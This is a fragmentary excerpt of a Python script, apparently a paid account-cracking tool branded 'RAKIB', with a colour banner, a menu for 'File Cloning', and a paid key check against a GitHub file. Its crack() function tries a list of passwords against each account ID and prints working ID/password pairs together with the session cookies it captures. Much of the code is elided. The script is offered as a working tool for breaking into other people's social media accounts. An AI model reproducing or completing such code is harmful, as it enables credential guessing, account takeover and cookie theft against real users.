...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'RAKIB' and password == 'Love':
...
def banner():
	os.system("clear")
	print (f"""\033[0;30m_____            _  _______ ____
      \033[0;35m |  __ \     /\   | |/ /_   _|  _ \
      \033[0;32m | |__) |   /  \  | ' /  | | | |_) |
      \033[0;34m |  _  /   / /\ \ |  <   | | |  _ <
      \033[0;33m | | \ \  / ____ \| . \ _| |_| |_) |
      \033[0;32m |_|  \_\/_/    \_\_|\_\_____|____/                         
\033[0;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[0;32m║        \033[0;33m[ WORKING ONLY MOBILE DATA ]         \033[0;32m║
\033[0;32m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;30m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                   
\033[0;30m║ [●]  Author        :          MR RAKIB      ║
\033[0;30m║ [●]  TOOLS         :          P A I D      ║
\033[0;30m║ [●]  VERSION       :           1.0          ║                   
\033[0;30m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
def login():
	banner()
	RAKIBj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	RAKIBj('\033[0;97m===============================================')
	RAKIB= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if RAKIB in ['m']:
		public()
	elif RAKIB in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[RAKIB-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#RAKIB-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RAKIB-Cp] {idf} • {pw}')     
				...
				#RAKIB-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RAKIB-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/RAKIB-King/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m RAKIB King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+RAKIB+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+RAKIB+''+key1
